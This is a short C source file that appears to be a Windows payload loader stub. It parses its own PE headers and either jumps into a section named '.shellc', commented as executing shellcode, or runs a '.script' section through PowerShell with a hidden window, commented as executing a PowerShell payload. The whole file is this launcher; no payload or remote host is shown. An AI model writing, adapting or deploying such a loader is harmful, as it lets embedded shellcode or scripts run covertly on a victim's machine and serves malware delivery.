#include <stdbool.h>
#include <stdint.h>
#include <windows.h>

bool _strcmp(const char* restrict a, const char* restrict b) {
    while (*a != '\0' && *b != '\0'){
        if (*a++ != *b++) 
            break;
    }
    return *a == '\0' && *b == '\0';
}

void _start() {
    uintptr_t pModAddr = (uintptr_t)GetModuleHandleA(NULL);
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)(pModAddr);
    IMAGE_NT_HEADERS* pNTHeader = (IMAGE_NT_HEADERS*)(pModAddr + pDosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* pSections = (IMAGE_SECTION_HEADER*)(pNTHeader + 1);

    for (int i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++) {
        if (_strcmp(pSections[i].Name, ".shellc")) {
            ((void(*)())(pModAddr + pSections[i].VirtualAddress))(); // Execute shellcode
            break;
        }
        if (_strcmp(pSections[i].Name, ".script")) {
            ShellExecuteA(NULL, "open", "powershell.exe", (char*)(pModAddr + pSections[i].VirtualAddress), NULL, SW_HIDE); // Execute Powershell payload
            break;
        }
    }
    return;
}
